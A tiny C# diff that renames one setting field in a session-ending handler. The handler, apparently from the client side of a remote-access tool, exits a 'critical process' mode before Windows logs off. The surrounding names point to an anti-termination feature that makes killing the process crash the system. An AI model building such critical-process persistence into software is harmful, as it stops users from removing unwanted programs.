@@ -16,7 +16,7 @@ namespace Client.Helper
   {
     public static void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
     {
-      if (!Convert.ToBoolean(Settings.BS_OD) || !Methods.IsAdmin())
+      if (!Convert.ToBoolean(Settings.bsOd) || !Methods.IsAdmin())
         return;
       ProcessCritical.Exit();
     }
